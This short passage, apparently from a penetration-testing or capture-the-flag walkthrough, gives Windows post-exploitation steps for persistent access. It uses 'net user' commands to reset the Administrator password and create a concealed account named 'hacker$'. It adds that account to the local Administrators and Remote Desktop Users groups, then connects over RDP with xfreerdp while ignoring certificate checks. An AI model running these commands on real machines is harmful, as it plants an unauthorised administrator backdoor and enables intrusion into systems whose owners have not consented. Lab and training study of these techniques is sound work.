> We could change the administrators password which will allow us to psexec or rdp into the machine:

```
net user Administrator Newpassword1 
```

We can also make a new user which is what I would recommend.

> **Create a new user:**

```
net user hacker$ P@ssw0rd123 /add
```

> **Add it to the local administrators group:**

```
net localgroup Administrators hacker$ /add
```

> **Add it to the RDP group:**

```
net localgroup "Remote Desktop Users" hacker$ /add
```

> Now RDP into the machine:

```
xfreerdp3 +cert:ignore +compression +auto-reconnect +u:hacker$ +p:'P@ssw0rd123' +v:<ip> +dynamic-resolution +clipboard
```

